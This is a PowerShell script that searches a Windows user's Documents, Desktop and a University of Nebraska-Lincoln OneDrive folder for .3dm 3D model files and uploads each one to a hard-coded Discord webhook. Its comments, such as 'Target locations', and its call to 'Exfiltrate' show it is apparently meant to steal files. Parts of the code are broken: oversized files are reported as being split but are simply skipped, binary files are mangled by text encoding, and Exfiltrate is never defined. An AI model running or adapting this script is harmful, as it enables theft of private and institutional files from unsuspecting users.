# Discord webhook
$hookurl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"

# Target locations
$foldersToSearch = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

function Upload-ToDiscord {
    param($FilePath)
    try {
        # Reduced chunk size to 8MB (Discord's limit is 25MB but we want buffer)
        $chunkSize = 8MB
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        if ($fileBytes.Length -gt $chunkSize) {
            Write-Host "[!] File too large, splitting into chunks..." -ForegroundColor Yellow
            return
        }

        $boundary = [System.Guid]::NewGuid().ToString()
        $fileName = Split-Path $FilePath -Leaf  # Only filename, no path
        
        $body = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream`r`n",
            [System.Text.Encoding]::UTF8.GetString($fileBytes),
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
    }
    catch {
        Write-Host "[!] Upload failed: $_" -ForegroundColor Red
    }
}

function Process-Files {
    Get-ChildItem -Path $foldersToSearch -Filter "*.3dm" -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            # Upload each file individually (no zipping)
            Write-Host "[+] Found: $($_.Name)" -ForegroundColor Cyan
            Upload-ToDiscord -FilePath $_.FullName
        }
        catch {
            Write-Host "[!] Error processing $($_.Name): $_" -ForegroundColor Red
        }
    }
}

# Execution with visibility control
[Console]::WindowWidth = 80
[Console]::WindowHeight = 30
Process-Files
Write-Host "Operation complete" -ForegroundColor Green
Start-Sleep -Seconds 5
[Console]::WindowHeight = 30
Exfiltrate
Start-Sleep -Seconds 5
